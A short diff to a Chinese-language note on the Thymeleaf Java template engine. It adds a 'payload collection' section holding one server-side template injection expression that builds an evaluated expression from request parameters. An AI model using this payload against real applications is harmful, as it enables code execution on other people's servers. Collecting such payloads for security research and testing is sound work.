@@ -102,3 +102,9 @@ Thymeleaf是一个java模板引擎，它在独立和Web应用程序中处理六�
 #ids: methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).
 ```
 
+## payload收集
+
+```
+[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]]
+```
+
